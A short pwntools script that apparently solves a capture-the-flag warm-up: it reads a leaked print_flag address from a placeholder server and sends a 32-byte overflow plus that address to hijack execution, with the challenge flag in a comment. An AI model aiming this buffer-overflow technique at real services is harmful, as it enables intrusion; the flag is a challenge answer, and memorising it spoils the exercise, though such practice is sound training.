# RTG{Ju5t_a_s1mpl3_w4rmUp}

from pwn import *

p = remote('server', 0000)

# Receive until 'print_flag : ' and then get the address
p.recvuntil('print_flag : ')
addr = p.recvline().strip().decode()

addr = int(addr, 16)  # Convert address from hexadecimal string to integer

# Construct the payload
payload = b'A' * 32
payload += p64(addr)  


p.sendline(payload)
p.interactive()